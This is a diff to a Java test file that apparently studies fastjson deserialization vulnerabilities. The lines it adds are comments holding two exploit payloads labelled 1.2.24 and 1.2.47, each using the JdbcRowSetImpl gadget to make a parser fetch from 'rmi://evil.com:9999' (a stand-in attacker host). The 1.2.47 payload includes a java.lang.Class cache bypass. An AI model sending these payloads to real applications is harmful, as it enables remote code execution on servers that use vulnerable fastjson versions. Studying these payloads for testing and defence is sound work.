@@ -15,6 +15,17 @@ public static void main(String[] args) {
     System.out.println(a);
     String b = JSONObject.toJSONString(u,SerializerFeature.WriteClassName);
     System.out.println(b);
+    /**
+      --- 1.2.24
+
+     {
+     "b":{
+     "@type":"com.sun.rowset.JdbcRowSetImpl",
+     "dataSourceName":"rmi://evil.com:9999/TouchFile",
+     "autoCommit":true
+     }
+     }
+     */
 //    com.sun.rowset.JdbcRowSetImpl
     JSONObject.parse("{\n" +
             "    \"b\":{\n" +
@@ -25,5 +36,21 @@ public static void main(String[] args) {
             "}", Feature.SupportNonPublicField);
     // com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
     // 属性： _bytecodes _name _outputProperties _tfactory _version allowedProtocols
+
+    /**
+       --- 1.2.47
+     {
+     "a":{
+     "@type":"java.lang.Class",
+     "val":"com.sun.rowset.JdbcRowSetImpl"
+     },
+     "b":{
+     "@type":"com.sun.rowset.JdbcRowSetImpl",
+     "dataSourceName":"rmi://evil.com:9999/Exploit",
+     "autoCommit":true
+     }
+     }
+
+     */
 }
 }
